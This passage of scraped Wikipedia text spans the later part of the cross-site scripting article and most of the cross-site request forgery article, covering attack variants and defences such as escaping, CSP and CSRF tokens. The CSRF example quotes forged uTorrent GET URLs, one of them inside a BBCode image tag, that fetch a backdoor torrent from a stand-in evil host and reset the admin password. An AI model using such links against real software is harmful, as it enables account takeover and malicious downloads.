Because HTML documents have a flat, serial structure that mixes control statements, formatting, and the actual content, any non-validated user-supplied data included in the resulting page without proper HTML encoding, may lead to markup injection.
[
10
]
[
12
]
 A classic example of a potential vector is a site search engine: if one searches for a string, the search string will typically be redisplayed verbatim on the result page to indicate what was searched for. If this response does not properly 
escape
 or reject HTML control characters, a cross-site scripting flaw will ensue.
[
13
]


A reflected attack is typically delivered via email or a neutral web site. The bait is an innocent-looking URL, pointing to a trusted site but containing the XSS vector. If the trusted site is vulnerable to the vector, clicking the link can cause the victim's browser to execute the injected script.



Persistent (or stored)
[
edit
]


The 
persistent
 (or 
stored
) XSS vulnerability is a more devastating variant of a cross-site scripting flaw: it occurs when the data provided by the attacker is saved by the server, and then permanently displayed on "normal" pages returned to other users in the course of regular browsing, without proper HTML escaping. A classic example of this is with online message boards where users are allowed to post HTML formatted messages for other users to read.
[
12
]


For example, suppose there is a dating website where members scan the profiles of other members to see if they look interesting.  For privacy reasons, this site hides everybody's real name and email.  These are kept secret on the server.  The only time a member's real name and 
email
 are in the browser is when the member is 
signed in
, and they can't see anyone else's.

Suppose that Mallory, an attacker, joins the site and wants to figure out the real names of the people she sees on the site.  To do so, she writes a script designed to run from other users' browsers when 
they
 visit 
her
 profile.  The script then sends a quick message to her own server, which collects this information.

To do this, for the question "Describe your Ideal First Date", Mallory gives a short answer (to appear normal), but the text at the end of her answer is her script to steal names and emails.  If the script is enclosed inside a 
<script>
 element, it won't be shown on the screen.  Then suppose that Bob, a member of the dating site, reaches Mallory's profile, which has her answer to the First Date question. Her script is run automatically by the browser and steals a copy of Bob's real name and email directly from his own machine.

Persistent XSS vulnerabilities can be more significant than other types because an attacker's malicious script is rendered automatically, without the need to individually target victims or lure them to a third-party website. Particularly in the case of social networking sites, the code would be further designed to self-propagate across accounts, creating a type of client-side 
worm
.
[
14
]


The methods of injection can vary a great deal; in some cases, the attacker may not even need to directly interact with the web functionality itself to exploit such a hole. Any data received by the web application (via email, system logs, IM etc.) that can be controlled by an attacker could become an injection vector.



Server-side versus DOM-based vulnerabilities
[
edit
]


XSS vulnerabilities were originally found in applications that performed all data processing on the server side. User input (including an XSS vector) would be sent to the server, and then sent back to the user as a web page. The need for an improved user experience resulted in popularity of applications that had a majority of the presentation logic (maybe written in 
JavaScript
) working on the client-side that pulled data, on-demand, from the server using 
AJAX
.

As the JavaScript code was also processing user input and rendering it in the web page content, a new sub-class of reflected XSS attacks started to appear that was called 
DOM
-based cross-site scripting
. In a DOM-based XSS attack, the malicious data does not touch the web server. Rather, it is being reflected by the JavaScript code, fully on the client side.
[
15
]


An example of a DOM-based XSS vulnerability is the bug found in 2011 in a number of 
jQuery
 plugins.
[
16
]
 Prevention strategies for DOM-based XSS attacks include very similar measures to traditional XSS prevention strategies but implemented in 
JavaScript
 code and contained in web pages (i.e. input validation and escaping).
[
17
]
 Some 
JavaScript frameworks
 have built-in countermeasures against this and other types of attack — for example 
AngularJS
.
[
18
]




Self-XSS
[
edit
]


Main article: 
Self-XSS


Self-XSS
 is a form of XSS vulnerability that relies on 
social engineering
 in order to trick the victim into executing malicious JavaScript code in their browser. Although it is technically not a true XSS vulnerability due to the fact it relies on socially engineering a user into executing code rather than a flaw in the affected website allowing an attacker to do so, it still poses the same risks as a regular XSS vulnerability if properly executed.
[
19
]




Mutated XSS (mXSS)
[
edit
]


Mutated XSS happens when the attacker injects something that is seemingly safe but is rewritten and modified by the browser while parsing the markup. This makes it extremely hard to detect or sanitize within the website's application logic. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters on parameters to CSS font-family.



Preventive measures
[
edit
]


Contextual output encoding/escaping of string input
[
edit
]


There are several escaping schemes that can be used depending on where the untrusted string needs to be placed within an HTML document including HTML entity encoding, JavaScript escaping, CSS escaping, and 
URL (or percent) encoding
.
[
20
]
 Most web applications that do not need to accept rich data can use escaping to largely eliminate the risk of XSS attacks in a fairly straightforward manner.

Performing HTML entity encoding only on the 
five XML significant characters
 is not always sufficient to prevent many forms of XSS attacks, security encoding libraries are usually easier to use.
[
20
]


Some 
web template systems
 understand the structure of the HTML they produce and automatically pick an appropriate encoder.
[
21
]
[
22
]
[
23
]




Safely validating untrusted HTML input
[
edit
]


Many operators of particular web applications (e.g. forums and webmail) allow users to utilize a limited subset of HTML markup. When accepting HTML input from users (say, 
<b>very</b> large
), output encoding (such as 
&lt;b&gt;very&lt;/b&gt; large
) will not suffice since the user input needs to be rendered as HTML by the browser (so it shows as "
very
 large", instead of "<b>very</b> large"). Stopping an XSS attack when accepting HTML input from users is much more complex in this situation. Untrusted HTML input must be run through an 
HTML sanitization
 engine to ensure that it does not contain XSS code.

Many validations rely on parsing out (blacklisting) specific "at risk" HTML tags such as the 
iframe tag
, link and the script tag.

There are several issues with this approach, for example sometimes seemingly harmless tags can be left out which when utilized correctly can still result in an XSS

Another popular method is to strip user input of " and ' however this can also be bypassed as the payload can be concealed with 
obfuscation
.



Cookie security
[
edit
]


Further information: 
HTTP cookie


Besides content filtering, other imperfect methods for cross-site scripting mitigation are also commonly used. One example is the use of additional security controls when handling 
cookie
-based user authentication. Many web applications rely on session cookies for authentication between individual HTTP requests, and because client-side scripts generally have access to these cookies, simple XSS exploits can steal these cookies.
[
24
]
 To mitigate this particular threat (though not the XSS problem in general), many web applications tie session cookies to the IP address of the user who originally logged in, then only permit that IP to use that cookie.
[
25
]
 This is effective in most situations (if an attacker is only after the cookie), but obviously breaks down in situations where an attacker is behind the same 
NATed
 IP address or 
web proxy
 as the victim, or the victim is changing his or her 
mobile IP
.
[
25
]




Http-only cookie
[
edit
]


Main article: 
Http-only cookie


Another mitigation present in 
Internet Explorer
 (since version 6), 
Firefox
 (since version 2.0.0.5), 
Safari
 (since version 4), 
Opera
 (since version 9.5) and 
Google Chrome
, is an 
HttpOnly
 flag which allows a web server to set a cookie that is unavailable to client-side scripts. While beneficial, the feature can neither fully prevent cookie theft nor prevent attacks within the browser.
[
26
]




Disabling scripts
[
edit
]


While 
Web 2.0
 and 
Ajax
 developers require the use of JavaScript,
[
27
]
 some web applications are written to allow operation without the need for any client-side scripts.
[
28
]
 This allows users, if they choose, to disable scripting in their browsers before using the application. In this way, even potentially malicious client-side scripts could be inserted unescaped on a page, and users would not be susceptible to XSS attacks.

Some browsers or browser plugins can be configured to disable client-side scripts on a per-domain basis. This approach is of limited value if scripting is allowed by default, since it blocks bad sites only 
after
 the user knows that they are bad, which is too late.  Functionality that blocks all scripting and external inclusions by default and then allows the user to enable it on a per-domain basis is more effective. This has been possible for a long time in Internet Explorer (since version 4) by setting up its so called "Security Zones",
[
29
]
 and in Opera (since version 9) using its "Site Specific Preferences".
[
30
]
 A solution for Firefox and other 
Gecko
-based browsers is the open source 
NoScript
 add-on which, in addition to the ability to enable scripts on a per-domain basis, provides some XSS protection even when scripts are enabled.
[
31
]


The most significant problem with blocking all scripts on all websites by default is substantial reduction in functionality and responsiveness (client-side scripting can be much faster than server-side scripting because it does not need to connect to a remote server and the page or 
frame
 does not need to be reloaded).
[
32
]
 Another problem with script blocking is that many users do not understand it, and do not know how to properly secure their browsers. Yet another drawback is that many sites do not work without client-side scripting, forcing users to disable protection for that site and opening their systems to vulnerabilities.
[
33
]
 The Firefox NoScript extension enables users to allow scripts selectively from a given page while disallowing others on the same page. For example, scripts from example.com could be allowed, while scripts from advertisingagency.com that are attempting to run on the same page could be disallowed.
[
34
]




Selectively disabling scripts
[
edit
]


Content Security Policy
[
edit
]


Main article: 
Content Security Policy


Content Security Policy
 (CSP) allows HTML documents to opt in to disabling some scripts while leaving others enabled.
[
35
]
 The browser checks each script against a policy before deciding whether to run it. As long as the policy only allows trustworthy scripts and disallows 
dynamic code loading
, the browser will not run programs from untrusted authors regardless of the HTML document's structure.

Modern CSP policies allow using 
nonces
 to mark scripts in the HTML document as safe to run instead of keeping the policy entirely separate from the page content.
[
36
]
[
37
]
 As long as trusted nonces only appear on trustworthy scripts, the browser will not run programs from untrusted authors. Some large application providers report having successfully deployed nonce-based policies.
[
38
]
[
39
]




Emerging defensive technologies
[
edit
]


Trusted types
[
40
]
 changes 
Web APIs
 to check that values have been 
trademarked
 as trusted.  As long as programs only trademark trustworthy values, an attacker who controls a JavaScript 
string value
 cannot cause XSS.  Trusted types are designed to be 
auditable
 by 
blue teams
.

Another defense approach is to use automated tools that will remove XSS malicious code in web pages, these tools use 
static analysis
 and/or pattern matching methods to identify malicious codes potentially and secure them using methods like escaping.
[
41
]




SameSite cookie parameter
[
edit
]


Main article: 
Same-site cookie


When a cookie is set with the 
SameSite=Strict
 parameter, it is stripped from all cross-origin requests. When set with 
SameSite=Lax
, it is stripped from all non-"safe" cross-origin requests (that is, requests other than GET, OPTIONS, and TRACE which have read-only semantics).
[
42
]
 The feature is implemented in 
Google Chrome
 since version 63 and 
Firefox
 since version 60.
[
43
]




See also
[
edit
]


Web application security


Internet security


XML external entity


Browser security


Metasploit Project
, an open-source penetration testing tool that includes tests for XSS


w3af
, an open-source 
web application security scanner


DOMPurify, a 
free and open source
 code library by 
Cure53
 to reduce susceptibility to XSS vulnerabilities in websites.


Cross-document messaging


Samy (computer worm)


Parameter validation


References
[
edit
]






^
 
"Symantec Internet Security Threat Report: Trends for July–December 2007 (Executive Summary)"
 
(PDF)
. 
Yahoo
. April 2008. pp. 1–3. 
Archived
 
(PDF)
 from the original on June 25, 2008
. Retrieved 
January 1,
 2024
.




^
 
"Cross Site Scripting Prevention - OWASP Cheat Sheet Series"
. 
OWASP
. Retrieved 
March 19,
 2003
.




^
 
"Same Origin Policy - Web Security. W3.org"
. Retrieved 
November 4,
 2014
.




^
 
"dross" on MSDN (December 15, 2009). 
"Happy 10th birthday Cross-Site Scripting!"
. Retrieved 
February 9,
 2023
. 
On the 16th of January, 2000, the following names were suggested and bounced around among a small group of Microsoft security engineers: [...] The next day there was consensus – Cross Site Scripting.




^
 
Grossman, Jeremiah (July 30, 2006). 
"The origins of Cross-Site Scripting (XSS)"
. Retrieved 
September 15,
 2008
.




^
 
Arthur, Charles (September 21, 2010). 
"Twitter users including Sarah Brown hit by malicious hacker attack"
. 
The Guardian
. Retrieved 
September 21,
 2010
.




^
 
Leyden, John (May 23, 2008). 
"Facebook poked by XSS flaw"
. 
The Register
. Retrieved 
May 28,
 2008
.




^
 
Christey, Steve; Martin, Robert A. (May 22, 2007). 
"Vulnerability Type Distributions in CVE (version 1.1)"
. MITRE Corporation
. Retrieved 
June 7,
 2008
.




^
 


Berinato, Scott (January 1, 2007). 
"Software Vulnerability Disclosure: The Chilling Effect"
. 
CSO
. 
CXO Media
. p. 7. Archived from 
the original
 on April 18, 2008
. Retrieved 
June 7,
 2008
.




^ 
a
 
b
 
Paco, Hope; Walther, Ben (2008). 
Web Security Testing Cookbook
. Sebastopol, CA: O'Reilly Media, Inc. p. 
128
. 
ISBN
 
978-0-596-51483-9
.




^
 
Hydara, Isatou; Sultan, Abu Bakar Md.; Zulzalil, Hazura; Admodisastro, Novia (February 1, 2015). 
"Current state of research on cross-site scripting (XSS) – A systematic literature review"
. 
Information and Software Technology
. 
58
: 170–186. 
doi
:
10.1016/j.infsof.2014.07.010
.




^ 
a
 
b
 
c
 
"Cross-site Scripting"
. Web Application Security Consortium. 2005
. Retrieved 
May 28,
 2008
.




^
 
Grossman, Jeremiah; Hansen, Robert; Fogie, Seth; Petkov, Petko D.; Rager, Anton (2007). 
XSS Attacks: Cross Site Scripting Exploits and Defense (Abstract)
. Syngress. pp. 70, 156. 
ISBN
 
978-1-59749-154-9
. Retrieved 
May 28,
 2008
.




^
 
Viruses and worms in 
Alcorn, Wade (September 27, 2005). 
"The Cross-site Scripting Virus"
. BindShell.net. Archived from 
the original
 on May 16, 2008
. Retrieved 
May 27,
 2008
.
 and 
Grossman, Jeremiah (November 2020). 
"Cross-Site Scripting Worms and Viruses: The Impending Threat and the Best Defense"
. WhiteHat Security. p. 20
. Retrieved 
June 6,
 2008
.
[
permanent dead link
]




^
 
"DOM based XSS"
. OWASP.




^
 
"JQuery bug #9521"
. 2011.




^
 
"DOM based XSS prevention cheat sheet"
. OWASP.




^
 
"Strict Contextual Escaping"
. Angular.js.




^
 
"Self-XSS Facebook scam attempts to trick users into hacking themselves"
. 
www.majorgeeks.com
. July 29, 2014
. Retrieved 
September 20,
 2016
.




^ 
a
 
b
 
Williams, Jeff (January 19, 2009). 
"XSS (Cross Site Scripting) Prevention Cheat Sheet"
. OWASP. Archived from 
the original
 on March 18, 2017
. Retrieved 
February 4,
 2010
.




^
 
"template - The Go Programming Language"
. 
golang.org
. Retrieved 
May 1,
 2019
.




^
 
"Google Developers"
. 
Google Developers
. Retrieved 
May 1,
 2019
.




^
 
"pug-plugin-trusted-types"
. 
npm
. Retrieved 
May 1,
 2019
.




^
 
Sharma, Anand (February 3, 2004). 
"Prevent a cross-site scripting attack"
. IBM
. Retrieved 
May 29,
 2008
.




^ 
a
 
b
 
"ModSecurity: Features: PDF Universal XSS Protection"
. Breach Security. Archived from 
the original
 on March 23, 2008
. Retrieved 
June 6,
 2008
.




^
 
"Ajax and Mashup Security"
. OpenAjax Alliance. Archived from 
the original
 on April 3, 2008
. Retrieved 
June 9,
 2008
.




^
 
O'Reilly, Tim (September 30, 2005). 
"What Is Web 2.0"
. O'Reilly Media. pp. 4–5
. Retrieved 
June 4,
 2008
.




^
 
"A page should work, even if in a degraded form, without JavaScript." in 
Zammetti, Frank (April 16, 2007). 
Practical JavaScript, DOM Scripting and Ajax Projects via Amazon Reader
. Apress. p. 36. 
ISBN
 
978-1-59059-816-0
. Retrieved 
June 4,
 2008
.




^
 
"How to use security zones in Internet Explorer"
. Microsoft. December 18, 2007
. Retrieved 
June 4,
 2008
.




^
 
Lie, Håkon Wium (February 7, 2006). 
"Opera 9 Technology Preview 2"
. Opera Software. Archived from 
the original
 on May 17, 2008
. Retrieved 
June 4,
 2008
.




^
 
"NoScript"
. Mozilla. May 30, 2008
. Retrieved 
June 4,
 2008
.
 and 
Mogull, Rich (March 18, 2008). 
"Should Mac Users Run Antivirus Software?"
. 
TidBITS
. TidBITS Publishing
. Retrieved 
June 4,
 2008
.




^
 
"
"Using client-side events" in DataWindow Programmer's Guide"
. Sybase. March 2003. Archived from 
the original
 on June 18, 2008
. Retrieved 
June 4,
 2008
.




^
 
73% of sites relied on JavaScript in late 2006, in 
"
'Most websites' failing disabled"
. 
BBC News
. December 6, 2006
. Retrieved 
June 4,
 2008
.




^
 
"NoScript Features"
. Retrieved 
March 7,
 2009
.




^
 
"Content Security Policy Level 3"
. 
www.w3.org
. Retrieved 
May 1,
 2019
.




^
 
"Can I use... Support tables for HTML5, CSS3, etc"
. 
caniuse.com
. Retrieved 
May 1,
 2019
.




^
 
"Strict CSP - Content Security Policy"
. 
csp.withgoogle.com
. Retrieved 
May 1,
 2019
.




^
 
"How Google Is Using Content Security Policy to Mitigate Web Flaws"
. 
eWEEK
. April 22, 2019
. Retrieved 
May 1,
 2019
.




^
 
Akhawe, Devdatta (September 21, 2015). 
"[CSP] On Reporting and Filtering"
. 
Dropbox
. Retrieved 
January 1,
 2024
.




^
 
"Trusted Types Spec WIP"
. 
wicg.github.io
. Retrieved 
May 1,
 2019
.




^
 
L. K. Shar and H. B. K. Tan, "Automated removal of cross site scripting vulnerabilities in web applications,"  
Information and Software Technology,
 vol. 54, 
(5),
 pp. 467-478, 2012.




^
 
Mark, Goodwin; Mike, West (April 6, 2016). 
"Same-site Cookies"
. 
tools.ietf.org
. Retrieved 
May 4,
 2018
.




^
 
"Can I use... Support tables for HTML5, CSS3, etc"
. 
caniuse.com
. Retrieved 
May 4,
 2018
.






Further reading
[
edit
]


MacKenzie, Thomas. 
"ScriptAlert1.com – Concise Cross-Site Scripting Explanation in Multiple Languages"
. Retrieved 
October 24,
 2015
.


"Preventing XSS in ASP.NET Made Easy"
. 
Lock Me Down | Security for the Everyday Developer
. February 6, 2015
. Retrieved 
October 24,
 2015
.


"Cross Site Scripting"
. 
The Web Application Security Consortium
. October 13, 2005
. Retrieved 
October 24,
 2015
.


External links
[
edit
]


OWASP
: 
XSS
, 
Testing for XSS
, 
Reviewing Code for XSS


XSSed: Database of Websites Vulnerable to Cross-Site Scripting Attacks


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Cross-site_scripting&oldid=1232455342
"


Categories
: 
Web security exploits
Injection exploits
Hacking (computer security)
Client-side web security exploits
Hidden categories: 
All articles with dead external links
Articles with dead external links from August 2018
Articles with permanently dead external links
Articles with short description
Short description is different from Wikidata
Use mdy dates from June 2019











From Wikipedia, the free encyclopedia






Malicious website exploit where unauthorized commands are transmitted from a trusted user


Cross-site request forgery
, also known as 
one-click attack
 or 
session riding
 and abbreviated as 
CSRF
 (sometimes pronounced 
sea-surf
[
1
]
) or 
XSRF
, is a type of malicious 
exploit
 of a 
website
 or 
web application
 where unauthorized commands are submitted from a 
user
 that the web application trusts.
[
2
]
 There are many ways in which a malicious website can transmit such commands; specially-crafted image tags, hidden forms, and 
JavaScript
 
 fetch
 or XMLHttpRequests, for example, can all work without the user's interaction or even knowledge. Unlike 
cross-site scripting
 (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user's browser.
[
3
]

In a CSRF attack, an innocent end user is tricked by an attacker into submitting a web request that they did not intend. This may cause actions to be performed on the website that can include inadvertent client or server data leakage, change of session state, or manipulation of an end user's account.

The term "CSRF" is also used as an abbreviation in defences against CSRF attacks, such as techniques that use header data, form data, or cookies, to test for and prevent such attacks.





Characteristics
[
edit
]


In a CSRF attack, the attacker's goal is to cause an innocent victim to unknowingly submit a maliciously crafted web request to a website that the victim has privileged access to. This web request can be crafted to include URL parameters, cookies and other data that appear normal to the web server processing the request. At risk are 
web applications
 that perform actions based on input from trusted and 
authenticated
 users without requiring the user to 
authorize
 (e.g. via a popup confirmation) the specific action. A user who is authenticated by a 
cookie
 saved in the user's 
web browser
 could unknowingly send an 
HTTP
 request to a site that trusts the user and thereby cause an unwanted action.

A general property of web browsers is that they will automatically and invisibly include any cookies (including session cookies and others) used by a given domain in any web request sent to that domain. This property is exploited by CSRF attacks. In the event that a user is tricked into inadvertently submitting a request through their browser these automatically included cookies will cause the forged request to appear real to the web server and it will perform any appropriately requested actions including returning data, manipulating session state, or making changes to the victim's account.

In order for a CSRF attack to work, an attacker must identify a reproducible web request that executes a specific action such as changing an account password on the target page. Once such a request is identified, a link can be created that generates this malicious request and that link can be embedded on a page within the attacker's control.
[
1
]
[
4
]
 This link may be placed in such a way that it is not even necessary for the victim to click the link. For example, it may be embedded within an html image tag on an email sent to the victim which will automatically be loaded when the victim opens their email. Once the victim has clicked the link, their browser will automatically include any cookies used by that website and submit the request to the web server. The web server will not be able to identify the forgery because the request was made by a user that was logged in, and submitted all the requisite cookies.

Cross-site request forgery is an example of a 
confused deputy attack
 against a web browser because the web browser is tricked into submitting a forged request by a less privileged attacker.

CSRF commonly has the following characteristics:



It involves sites that rely on a user's 
identity
.


It exploits the site's trust in that identity.


It tricks the user's browser into sending 
HTTP
 requests to a target site where the user is already authenticated.


It involves HTTP requests that have 
side effects
.


History
[
edit
]


CSRF Token vulnerabilities have been known and in some cases exploited since 2001.
[
5
]
 Because it is carried out from the user's 
IP address
, some website logs might not have evidence of CSRF.
[
2
]
 Exploits are under-reported, at least publicly, and as of 2007
[
6
]
 there were few well-documented examples: 



The 
Netflix
 website in 2006 had numerous vulnerabilities to CSRF, which could have allowed an attacker to perform actions such as adding a DVD to the victim's rental queue, changing the shipping address on the account, or altering the victim's login credentials to fully compromise the account.
[
7
]


The online banking web application of 
ING Direct
 was vulnerable to a CSRF attack that allowed illicit money transfers.
[
8
]


Popular video website 
YouTube
 was also vulnerable to CSRF in 2008 and this allowed any attacker to perform nearly all actions of any user.
[
8
]


McAfee Secure
 was also vulnerable to CSRF and it allowed attackers to change their company system. This is fixed in newer versions.
[
9
]


New attacks against web-enabled devices were carried out in 2018, including attempts to change the DNS settings of routers. Some router manufacturers hurriedly released firmware updates to improve protection, and advised users to change router settings to reduce the risk. Details were not released, citing "obvious security reasons".
[
10
]




Example
[
edit
]


A 
National Vulnerability Database
 page describing a CSRF vulnerability


Attackers who can find a reproducible link that executes a specific action on the target page while the victim is logged in can embed such link on a page they control and trick the victim into opening it.
[
1
]
 The attack carrier link may be placed in a location that the victim is likely to visit while logged into the target site (for example, a discussion forum), or sent in an 
HTML email
 body or attachment. A real CSRF vulnerability in 
uTorrent
 (
CVE-2008-6586
) exploited the fact that its web console accessible at 
localhost
:8080 allowed critical actions to be executed using a simple GET request:



Force a 
.torrent
 file download


http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent


Change uTorrent administrator password


http://localhost:8080/gui/?action=setsetting&s=webui.password&v=eviladmin


Attacks were launched by placing malicious, automatic-action 
HTML image elements
 on forums and 
email spam
, so that browsers visiting these pages would open them automatically, without much user action. People running vulnerable uTorrent version at the same time as opening these pages were susceptible to the attack.

CSRF attacks using image tags are often made from 
Internet forums
, where users are allowed to post images but not 
JavaScript
, for example using 
BBCode
:



[img]
http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent
[/img]




When accessing the attack link to the local uTorrent application at 
localhost:8080
, the browser would also always automatically send any existing 
cookies
 for that domain. This general property of web browsers enables CSRF attacks to exploit their targeted vulnerabilities and execute hostile actions as long as the user is logged into the target website (in this example, the local uTorrent web interface) at the time of the attack.

In the uTorrent example described above, the attack was facilitated by the fact that uTorrent's web interface used 
GET request
 for critical state-changing operations (change credentials, download a file etc.), which 
RFC
 
2616
 explicitly discourages:



In particular, the convention has been established that the GET and HEAD methods SHOULD NOT have the significance of taking an action other than retrieval. These methods ought to be considered "safe". This allows user agents to represent other methods, such as POST, PUT and DELETE, in a special way, so that the user is made aware of the fact that a possibly unsafe action is being requested.


Because of this assumption, many existing CSRF prevention mechanisms in 
web frameworks
 will 
not
 cover 
GET requests
, but rather apply the protection only to HTTP methods that are intended to be state-changing.
[
11
]




Forging login requests
[
edit
]


An attacker may forge a request to log the victim into a target website using the attacker's credentials; this is known as 
login CSRF
. Login CSRF makes various novel attacks possible; for instance, an attacker can later log into the site with their legitimate credentials and view private information like activity history that has been saved in the account. This attack has been demonstrated against 
Google
[
12
]
 and 
Yahoo
.
[
13
]




HTTP verbs and CSRF
[
edit
]


Depending on the type, the 
HTTP
 
request methods
 vary in their susceptibility to the CSRF attacks (due to the differences in their handling by the 
web browsers
). Therefore, the protective measures against an attack depend on the method of the HTTP request.



In 
HTTP GET
 the CSRF exploitation is trivial, using methods described above, such as a simple 
hyperlink
 containing manipulated parameters and automatically loaded by an 
IMG tag
. By the HTTP specification however, GET should be used as a 
safe method
, that is, not significantly changing user's state in the application. Applications using GET for such operations should switch to 
HTTP POST
 or use anti-CSRF protection.


the 
HTTP POST
 vulnerability to CSRF depends on the usage scenario:

In simplest form of POST with data encoded as a 
query string
 (
field1=value1&field2=value2
) CSRF attack is easily implemented using a simple 
HTML form
 and anti-CSRF measures must be applied.


If data is sent in any other format (
JSON
, 
XML
) a standard method is to issue a POST request using 
XMLHttpRequest
 with CSRF attacks prevented by 
Same-origin policy
 (SOP) and 
Cross-origin resource sharing
 (CORS); there is a technique to send arbitrary content from a simple 
HTML form
 using 
ENCTYPE
 attribute; such a fake request can be distinguished from legitimate ones by 
text/plain
 content type, but if this is not enforced on the server, CSRF can be executed
[
14
]
[
15
]


other HTTP methods (PUT, DELETE etc.) can only be issued using 
XMLHttpRequest
 with 
Same-origin policy
 (SOP) and 
Cross-origin resource sharing
 (CORS) preventing CSRF; these measures however will not be active on websites that explicitly disable them using 
Access-Control-Allow-Origin: *
 header


Other approaches to CSRF
[
edit
]


Additionally, while typically described as a static type of attack, CSRF can also be dynamically constructed as part of a payload for a 
cross-site scripting
 attack, as demonstrated by the 
Samy
 worm, or constructed on the fly from session information leaked via offsite content and sent to a target as a malicious URL. CSRF tokens could also be sent to a client by an attacker due to 
session fixation
 or other vulnerabilities, or guessed via a brute-force attack, rendered on a malicious page that generates thousands of failed requests. The attack class of "Dynamic CSRF", or using a per-client payload for session-specific forgery, was described
[
16
]
 in 2009 by Nathan Hamiel and Shawn Moyer at the BlackHat Briefings,
[
17
]
 though the taxonomy has yet to gain wider adoption.

A new vector for composing dynamic CSRF attacks was presented by Oren Ofer at a local OWASP chapter meeting in January 2012 – "AJAX Hammer – Dynamic CSRF".
[
18
]
[
19
]




Effects
[
edit
]


Severity metrics have been issued for CSRF token vulnerabilities that result in 
remote code execution
 with 
root privileges
[
20
]
 as well as a vulnerability that can compromise a 
root certificate
, which will completely undermine a 
public key infrastructure
.
[
21
]




Limitations
[
edit
]


This section 
does not 
cite
 any 
sources
.
 Please help 
improve this section
 by 
adding citations to reliable sources
. Unsourced material may be challenged and 
removed
.
 
(
May 2018
)
 (
Learn how and when to remove this message
)


Several things have to happen for cross-site request forgery to succeed:



The attacker must target either a site that doesn't check the 
referrer header
 or a victim with a browser or plugin that allows 
referer spoofing
.
[
22
]


The attacker must find a form submission at the target site, or a URL that has side effects, that does something (e.g., transfers money, or changes the victim's e-mail address or password).


The attacker must determine the right values for all the forms or URL inputs; if any of them are required to be secret authentication values or IDs that the attacker can't guess, the attack will most likely fail (unless the attacker is extremely lucky in their guess).


The attacker must lure the victim to a web page with malicious code while the victim is logged into the target site.


The attack is blind: the attacker cannot see what the target website sends back to the victim in response to the forged requests, unless they exploit a 
cross-site scripting
 or other bug at the target website. Similarly, the attacker can only target any links or submit any forms that come up after the initial forged request if those subsequent links or forms are similarly predictable. (Multiple targets can be simulated by including multiple images on a page, or by using JavaScript to introduce a delay between clicks.)
[
23
]




Prevention
[
edit
]


Most CSRF prevention techniques work by embedding additional authentication data into requests that allows the web application to detect requests from unauthorized locations.



Synchronizer token pattern
[
edit
]


Synchronizer token pattern
 (STP) is a technique where a token, a secret and unique value for each request, is embedded by the web application in all HTML forms and verified on the server side. The token may be generated by any method that ensures unpredictability and uniqueness (e.g. using a 
hash chain
 of random seed). This is called a anti-forgery token in ASP.NET. The attacker is thus unable to place a correct token in their requests to authenticate them.
[
1
]
[
24
]
[
25
]


Example of STP set by 
Django
 in a HTML form:



<input
 
type=
"hidden"
 
name=
"csrfmiddlewaretoken"
 
value=
"KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt"
 
/>




STP is the most compatible as it only relies on HTML, but introduces some complexity on the server side, due to the burden associated with checking validity of the token on each request. As the token is unique and unpredictable, it also enforces proper sequence of events (e.g. screen 1, then 2, then 3) which raises usability problem (e.g. user opens multiple tabs). It can be relaxed by using per session CSRF token instead of per request CSRF token.



Cookie-to-header token
[
edit
]


Web applications that use 
JavaScript
 for the majority of their operations may use the following anti-CSRF technique:



On an initial visit without an associated server session, the web application sets a cookie. The cookie typically contains a random token which may remain the same for up to the life of the web session


Set-Cookie: __Host-csrf_token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; Expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/; SameSite=Lax; Secure



JavaScript
 operating on the client side reads its value and copies it into a custom 
HTTP header
 sent with each transactional request


X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql



The server validates presence and integrity of the token


Security of this technique is based on the assumption that only 
JavaScript
 running on the client side of an HTTPS connection to the server that initially set the cookie will be able to read the cookie's value. JavaScript running from a rogue file or email should not be able to successfully read the cookie value to copy into the custom header. Even though the 
csrf-token
 
cookie
 may be automatically sent with the rogue request, subject to the cookies SameSite policy, the server will still expect a valid 
X-Csrf-Token
 
header
.

The CSRF token itself should be unique and unpredictable. It may be generated randomly, or it may be derived from the 
session token
 using 
HMAC
:



csrf_token = HMAC(session_token, application_secret)



The CSRF token cookie must not have 
httpOnly
 flag, as it is intended to be read by 
JavaScript
 by design.

This technique is implemented by many modern frameworks, such as 
Django
[
26
]
 and 
AngularJS
.
[
27
]
 Because the token remains constant over the whole user session, it works well with 
AJAX
 applications, but does not enforce sequence of events in the web application.

The protection provided by this technique can be thwarted if the target website 
disables
 its 
same-origin policy
 using one of the following techniques:



clientaccesspolicy.xml
 file granting unintended access to Silverlight controls
[
28
]


crossdomain.xml
 file granting unintended access to Flash movies
[
29
]


Double Submit Cookie
[
edit
]


